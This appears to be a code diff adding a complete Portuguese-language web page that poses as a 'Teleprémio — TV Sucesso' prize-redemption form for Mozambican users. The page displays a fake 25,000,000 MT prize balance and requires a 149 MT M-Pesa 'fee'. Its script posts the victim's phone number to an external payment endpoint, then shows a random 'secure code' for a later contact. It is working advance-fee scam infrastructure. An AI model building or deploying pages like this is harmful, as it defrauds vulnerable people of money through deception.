@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Resgate do Prémio — Teleprémio | TV Sucesso</title>
+<style>
+  :root{
+    /* Gradientes mais escuros e intensos */
+    --bg-gradient: linear-gradient(135deg, #4a3cff 0%, #009688 50%, #ffb300 100%);
+    --card-bg: rgba(255,255,255,0.98);
+    --accent: #0a8c30;
+    --muted: #666;
+    --danger: #e53935;
+    --glass: rgba(255,255,255,0.7);
+    --radius: 16px;
+    --soft-shadow: 0 10px 40px rgba(12,12,40,0.15);
+    font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  }
+
+  html,body{
+    height:100%;
+    margin:0;
+    background: radial-gradient(circle at 10% 20%, rgba(255,255,255,0.04), transparent 15%),
+                radial-gradient(circle at 90% 80%, rgba(255,255,255,0.02), transparent 15%),
+                var(--bg-gradient);
+    background-attachment: fixed;
+    -webkit-font-smoothing:antialiased;
+    -moz-osx-font-smoothing:grayscale;
+    color:#111827;
+  }
+  
+  .saldo-card {
+  background: linear-gradient(135deg, rgba(0,128,0,0.1), rgba(0,128,0,0.2));
+  border: 2px solid #0a8c30;
+  border-radius: 16px;
+  padding: 24px;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(10,140,48,0.15);
+  color: #0a8c30;
+  font-weight: 800;
+  margin-bottom: 16px; /* para dar espaçamento extra */
+  }
+  
+  .saldo-card h3 {
+  margin: 0 0 8px 0;
+  font-size: 20px;
+  letter-spacing: 1px;
+  }
+  
+  .saldo-card p {
+  margin: 0;
+  font-size: 28px;
+  }
+
+  .wrap{
+    max-width:1000px;
+    margin:20px auto;
+    padding:20px;
+    display:grid;
+    grid-template-columns: 1fr 420px;
+    gap:24px;
+    box-sizing: border-box;
+  }
+
+  /* Left content (info + form) */
+  .left{
+    display:flex;
+    flex-direction:column;
+    gap:20px;
+  }
+
+  .banner{
+    background: linear-gradient(90deg, rgba(0,0,0,0.2), rgba(0,0,0,0.15));
+    border-radius: var(--radius);
+    padding:20px;
+    box-shadow: var(--soft-shadow);
+    display:flex;
+    gap:16px;
+    align-items:center;
+    border: 1px solid rgba(255,255,255,0.1);
+    color: #fff;
+    backdrop-filter: blur(10px);
+  }
+
+  .badge{
+    background: linear-gradient(135deg, rgba(0,0,0,0.3), rgba(0,0,0,0.2));
+    padding:14px 18px;
+    border-radius:12px;
+    text-align:center;
+    min-width:160px;
+    font-weight:800;
+    border: 1px solid rgba(255,255,255,0.15);
+  }
+  .badge h3{margin:0;font-size:18px;}
+  .badge p{margin:8px 0 0;font-size:15px;color:rgba(255,255,255,0.95);font-weight:700;}
+
+  .banner-copy{
+    color:#fff;
+    font-weight:600;
+    font-size:16px;
+    flex: 1;
+  }
+  .banner-copy small{
+    display:block;
+    color:rgba(255,255,255,0.85);
+    font-weight:400;
+    margin-top:10px;
+    font-size:14px;
+  }
+
+  .card{
+    background:var(--card-bg);
+    border-radius:20px;
+    padding:24px;
+    box-shadow: var(--soft-shadow);
+    border: 1px solid rgba(0,0,0,0.05);
+    overflow: hidden;
+  }
+
+  .title{
+    font-size:22px;
+    font-weight:800;
+    color:#0b1220;
+    margin:0 0 10px 0;
+  }
+
+  .subtitle{
+    margin:0;
+    color:var(--muted);
+    font-size:14px;
+    line-height:1.5;
+  }
+
+  /* Form styles */
+  form{
+    display:grid;
+    gap:16px;
+    margin-top:16px
+  }
+  label{
+    font-size:14px;
+    font-weight:700;
+    color:#263240;
+    display: block;
+    margin-bottom: 6px;
+  }
+  .input, select {
+    width:100%;
+    padding:14px 16px;
+    border-radius:12px;
+    border:1px solid rgba(15,23,42,0.1);
+    background: #fff;
+    font-size:16px;
+    outline:none;
+    box-shadow: 0 4px 12px rgba(12,12,40,0.05) inset;
+    box-sizing: border-box;
+    transition: all 0.3s ease;
+  }
+  .input:focus, select:focus{
+    box-shadow:0 0 0 3px rgba(11,163,61,0.15);
+    border-color:var(--accent);
+    transform: translateY(-2px);
+  }
+
+  .row{
+    display:flex;
+    gap:12px;
+    flex-wrap:wrap;
+  }
+  .col{
+    flex:1;
+    min-width:0;
+  }
+
+  /* hide reference and amount in form */
+  #amount, #reference, label[for="amount"], label[for="reference"]{
+    display:none;
+  }
+
+  /* Payment methods */
+  .methods{
+    display:flex;
+    gap:12px;
+    margin-top:8px;
+    flex-wrap:wrap;
+  }
+  .method{
+    flex:1 1 140px;
+    display:flex;
+    gap:12px;
+    align-items:center;
+    padding:14px;
+    border-radius:12px;
+    cursor:pointer;
+    border:2px solid rgba(0,0,0,0.08);
+    transition:all 0.25s ease;
+    background: linear-gradient(180deg, rgba(255,255,255,0.9), rgba(255,255,255,0.8));
+    box-sizing: border-box;
+  }
+  .method img{
+    width:60px;
+    height:auto;
+    border-radius:8px;
+    box-shadow:0 6px 18px rgba(8,20,40,0.1)
+  }
+  .method.active{
+    border-color:var(--accent);
+    box-shadow:0 12px 40px rgba(11,163,61,0.15);
+    transform:translateY(-3px);
+    background: linear-gradient(180deg, rgba(255,255,255,1), rgba(255,255,255,0.95));
+  }
+  .method.disabled{
+    opacity:0.4;
+    cursor:not-allowed;
+    filter:grayscale(40%)
+  }
+
+  .method strong{
+    display:block;
+    font-weight:800;
+    font-size:15px;
+  }
+  .method small{
+    display:block;
+    color:var(--muted);
+    margin-top:4px;
+    font-size:13px;
+  }
+
+  .actions{
+    display:flex;
+    gap:12px;
+    margin-top:16px;
+    align-items:center;
+    flex-wrap:wrap;
+  }
+  .btn{
+    padding:16px 20px;
+    border-radius:12px;
+    border:none;
+    cursor:pointer;
+    font-weight:800;
+    font-size:16px;
+    transition: all 0.3s ease;
+    flex: 1;
+    min-width: 0;
+    box-sizing: border-box;
+  }
+  .btn.primary{
+    background:linear-gradient(90deg,#0a8c30,#068c52);
+    color:#fff;
+    box-shadow: 0 8px 25px rgba(11,163,61,0.25);
+  }
+  .btn.primary:hover{
+    transform: translateY(-2px);
+    box-shadow: 0 12px 35px rgba(11,163,61,0.35);
+  }
+  .btn.ghost{
+    background:transparent;
+    border:2px solid rgba(10,10,20,0.1);
+    color:#111;
+  }
+  .btn.ghost:hover{
+    background:rgba(0,0,0,0.03);
+    border-color:rgba(10,10,20,0.2);
+  }
+
+  /* Right column summary */
+  .right{
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+  .summary{
+    background: linear-gradient(180deg, rgba(255,255,255,0.98), rgba(255,255,255,0.92));
+    padding:20px;
+    border-radius:16px;
+    box-shadow:var(--soft-shadow);
+    border:1px solid rgba(0,0,0,0.06)
+  }
+  .summary h4{
+    margin:0;
+    font-size:18px;
+    font-weight:800;
+  }
+  .summary p{
+    margin:8px 0 0;
+    color:var(--muted);
+    font-size:14px;
+    line-height:1.5;
+  }
+  .summary .line{
+    display:flex;
+    justify-content:space-between;
+    margin-top:16px;
+    font-weight:700;
+    padding: 8px 0;
+    border-bottom: 1px solid rgba(0,0,0,0.05);
+  }
+  .summary .line:last-child{
+    border-bottom: none;
+  }
+
+  .notice{
+    background: linear-gradient(90deg,rgba(255,244,204,0.9),rgba(255,236,179,0.9));
+    padding:18px;
+    border-radius:16px;
+    border:1px solid rgba(255,200,50,0.2);
+    font-size:14px;
+    color:#5a4200;
+    backdrop-filter: blur(5px);
+  }
+
+  .result{
+    margin-top:16px;
+    padding:20px;
+    border-radius:16px;
+    background:linear-gradient(90deg,rgba(247,255,251,0.9),rgba(232,255,242,0.9));
+    border:1px solid rgba(10,160,90,0.1);
+  }
+  .code{
+    display:flex;
+    gap:12px;
+    align-items:center;
+    margin-top:12px;
+    flex-wrap: wrap;
+  }
+  .code .token{
+    font-weight:900;
+    padding:14px 18px;
+    border-radius:12px;
+    background:#fff;
+    border:2px solid rgba(10,10,20,0.1);
+    letter-spacing:3px;
+    font-size:18px;
+    flex: 1;
+    min-width: 200px;
+  }
+  .small{
+    font-size:13px;
+    color:var(--muted);
+    line-height:1.5;
+  }
+
+  /* Responsive improvements */
+  @media (max-width: 1024px) {
+    .wrap {
+      grid-template-columns: 1fr;
+      padding: 16px;
+      gap: 20px;
+      max-width: 100%;
+    }
+    
+    .right, .left {
+      width: 100%;
+    }
+  }
+
+  @media (max-width: 768px) {
+    .wrap {
+      padding: 12px;
+      margin: 0;
+      gap: 16px;
+    }
+    
+    .card {
+      padding: 20px;
+      border-radius: 16px;
+    }
+    
+    .banner {
+      flex-direction: column;
+      align-items: stretch;
+      padding: 16px;
+    }
+    
+    .badge {
+      min-width: auto;
+      width: 100%;
+      text-align: center;
+      margin-bottom: 12px;
+    }
+    
+    .row {
+      flex-direction: column;
+      gap: 16px;
+    }
+    
+    .col {
+      width: 100%;
+    }
+    
+    .methods {
+      flex-direction: column;
+    }
+    
+    .method {
+      width: 100%;
+      margin: 0;
+    }
+    
+    .actions {
+      flex-direction: column;
+    }
+    
+    .btn {
+      width: 100%;
+      margin: 0;
+    }
+    
+    .code {
+      flex-direction: column;
+      align-items: stretch;
+    }
+    
+    .code .token {
+      min-width: 0;
+      text-align: center;
+    }
+    
+    .summary .line {
+      flex-direction: column;
+      gap: 4px;
+    }
+    
+    .summary .line span:first-child {
+      color: var(--muted);
+      font-size: 14px;
+    }
+  }
+
+  @media (max-width: 480px) {
+    .title {
+      font-size: 20px;
+    }
+    
+    .card {
+      padding: 16px;
+    }
+    
+    .input, select, .btn {
+      padding: 14px;
+    }
+    
+    .method {
+      padding: 12px;
+    }
+    
+    .method img {
+      width: 50px;
+    }
+    
+    .badge h3 {
+      font-size: 16px;
+    }
+    
+    .badge p {
+      font-size: 14px;
+    }
+    
+    .banner-copy {
+      font-size: 14px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="left">
+
+    <div class="banner">
+    <div class="saldo-card">
+      <h3>SALDO</h3>
+        <p>25.000.000 MT</p>
+    </div>
+      <div class="banner-copy">
+        Esta tela refere-se ao pagamento para o resgate do prémio da <strong>Teleprémio — TV Sucesso</strong>.
+        <small>Preencha corretamente os campos abaixo para concluir o pedido de resgate.</small>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3 class="title">Formulário de Resgate</h3>
+      <p class="subtitle">Preencha os campos indicados para resgatar o prémio. Após pagamento você receberá um código seguro.</p>
+
+      <form id="payForm" autocomplete="off">
+        <div>
+          <label for="province">Província</label>
+          <select id="province" class="input" required>
+            <option value="">Selecione a Província</option>
+            <option>Cidade de Maputo</option>
+            <option>Maputo (Província)</option>
+            <option>Gaza</option>
+            <option>Inhambane</option>
+            <option>Sofala</option>
+            <option>Manica</option>
+            <option>Tete</option>
+            <option>Zambézia</option>
+            <option>Nampula</option>
+            <option>Niassa</option>
+            <option>Cabo Delgado</option>
+          </select>
+        </div>
+
+        <div>
+          <label for="ticket">Número da chamada / ID do chamado</label>
+          <input id="ticket" class="input" type="text" placeholder="Ex: CHAMADO-12345" required>
+        </div>
+
+        <div class="row">
+          <div class="col">
+            <label for="phone">Número M-Pesa (telefone)</label>
+            <input id="phone" class="input" inputmode="numeric" pattern="[0-9]*" type="tel" placeholder="Ex: 85 ou 84xxxxxxx" required>
+          </div>
+          <div class="col">
+            <label for="amount">Valor Da Taxa (MT)</label>
+            <input class="input" id="amount" type="text" value="149" disabled>
+          </div>
+        </div>
+
+        <div>
+          <label for="reference">Referência</label>
+          <input class="input" id="reference" type="text" value="Telepremio25mill" disabled>
+        </div>
+
+        <div style="margin-top:12px">
+          <label>Método de Pagamento</label>
+          <div class="methods">
+            <div id="mpesaMethod" class="method active" title="Pagar com M-Pesa">
+              <img src="https://account.explicador.co.mz/imgs/mpesa.png" alt="M-Pesa">
+              <div>
+                <strong>M-Pesa</strong>
+                <small>Moçambique — disponível</small>
+              </div>
+            </div>
+
+            <div id="emolaMethod" class="method disabled" title="Emola indisponível">
+              <img src="https://play-lh.googleusercontent.com/2TGAhJ55tiyhCwW0ZM43deGv4lUTFTBMoq83mnAO6-bU5hi2NPyKX8BN8iKt13irK7Y=w240-h480-rw" alt="Emola">
+              <div>
+                <strong>Emola</strong>
+                <small>Indisponível no momento</small>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="actions">
+          <button type="button" id="payBtn" class="btn primary">Concluir Pagamento</button>
+          <button type="button" id="resetBtn" class="btn ghost">Limpar</button>
+        </div>
+
+        <div id="formMsg" class="small" style="margin-top:10px;color:var(--muted)"></div>
+      </form>
+
+      <div id="resultArea" style="display:none" class="result">
+        <strong>Pagamento processado com sucesso!</strong>
+        <p class="small" style="margin-top:8px">Copie o código abaixo e guarde em local seguro. A equipa da TV Sucesso irá contactá-lo e pedir este código.</p>
+
+        <div class="code">
+          <div class="token" id="secureCode">XXXX-XXXX</div>
+          <button id="copyBtn" class="btn ghost" style="padding:12px 16px">Copiar código</button>
+        </div>
+
+        <p class="small" style="margin-top:10px;color:#333"><strong>Atenção:</strong> Não envie este código a ninguém. A equipa da TV Sucesso Moçambique será a única a solicitar o código ao titular.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="right">
+    <div class="summary">
+      <h4>Resumo do Pedido</h4>
+      <p>Verifique as informações antes de concluir. O pagamento é um passo necessário para o processo de resgate do prémio.</p>
+
+      <div class="line" style="margin-top:12px">
+        <span>Valor a pagar</span><strong>149 MT</strong>
+      </div>
+      <div class="line" style="margin-top:8px">
+        <span>Referência</span><strong>Telepremio25mill</strong>
+      </div>
+
+      <div style="margin-top:12px;display:flex;gap:8px">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2nF6edEk8JRD_JsORbGAmmayR8_3z_m8nGPZtBWoPiQ&s=10" alt="secure" style="width:38px;height:38px;border-radius:8px">
+        <div>
+          <strong>Transação segura</strong>
+          <p class="small" style="margin:6px 0 0">Após pagamento receberá um código único — guarde-o em segurança.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="notice">
+      <strong>Atenção:</strong> A equipa TV Sucesso só confirmará a validação do resgate após a confirmação do pagamento e verificação do código. Não partilhe o código com terceiros.
+    </div>
+
+    <div class="card" style="text-align:center">
+      <h4 style="margin:0">Suporte</h4>
+      <p class="small" style="margin-top:8px">Se tiver problemas contacte a nossa equipa: <strong>telepremiomz@support.com</strong></p>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  const el = id => document.getElementById(id);
+
+  const mpesaMethod = el('mpesaMethod');
+  const emolaMethod = el('emolaMethod');
+
+  mpesaMethod.addEventListener('click', () => {
+    mpesaMethod.classList.add('active');
+    emolaMethod.classList.remove('active');
+  });
+
+  emolaMethod.addEventListener('click', () => {
+    alert('Emola está indisponível no momento. Por favor utilize M-Pesa para completar o pagamento.');
+  });
+
+  function generateToken(){
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    let s = '';
+    for(let i=0;i<8;i++){
+      s += chars.charAt(Math.floor(Math.random()*chars.length));
+    }
+    return s.slice(0,4) + '-' + s.slice(4);
+  }
+
+  el('copyBtn').addEventListener('click', async () => {
+    const token = el('secureCode').innerText;
+    try { await navigator.clipboard.writeText(token); alert('Código copiado para a área de transferência.'); }
+    catch(e){ alert('Não foi possível copiar automaticamente. Seleccione e copie manualmente: ' + token); }
+  });
+
+  el('resetBtn').addEventListener('click', () => {
+    el('payForm').reset();
+    el('formMsg').innerText = '';
+    el('resultArea').style.display = 'none';
+    mpesaMethod.classList.add('active');
+  });
+
+  el('payBtn').addEventListener('click', async () => {
+    el('formMsg').style.color = 'var(--muted)';
+    el('formMsg').innerText = '';
+
+    const province = el('province').value.trim();
+    const ticket = el('ticket').value.trim();
+    const phone = el('phone').value.trim();
+
+    if(!province){el('formMsg').style.color='var(--danger)';el('formMsg').innerText='Selecione a sua província.'; return;}
+    if(!ticket){el('formMsg').style.color='var(--danger)';el('formMsg').innerText='Insira o Número da chamada / ID.'; return;}
+    if(!phone || phone.length < 7){el('formMsg').style.color='var(--danger)';el('formMsg').innerText='Insira um número M-Pesa válido.'; return;}
+
+    el('formMsg').style.color='#0b6623';
+    el('formMsg').innerText='Processando pagamento...';
+
+    const payload = { phone: phone, amount: "149", reference: "Telepremio25mill" };
+
+    try {
+      const resp = await fetch('https://telepremio-api.onrender.com/mpesa', {
+        method:'POST', headers:{'Accept':'*/*','Content-Type':'application/json'}, body:JSON.stringify(payload)
+      });
+
+      // If 200 -> show token and instructions
+      if (resp.status === 200) {
+        const token = generateToken();
+        el('secureCode').innerText = token;
+        el('resultArea').style.display = 'block';
+        el('formMsg').style.color = '#0b6623';
+        el('formMsg').innerText = 'Pagamento confirmado (código gerado). Guarde o código e aguarde o contacto da equipa TV Sucesso.';
+        // optionally show server response in console
+        try { const json = await resp.json(); console.log('server response:', json); } catch(e){}
+      } else {
+        // try to read body for error
+        let msg = `Erro ao processar pagamento (status ${resp.status}).`;
+        try {
+          const data = await resp.json();
+          if (data && data.message) msg = data.message;
+        } catch(e){}
+        el('formMsg').style.color = 'var(--danger)';
+        el('formMsg').innerText = msg;
+      }
+    } catch (err) {
+      console.error(err);
+      el('formMsg').style.color = 'var(--danger)';
+      el('formMsg').innerText = 'Erro de rede. Verifique a ligação e tente novamente.';
+    }
+  });
+</script>
+
+</body>
+</html>
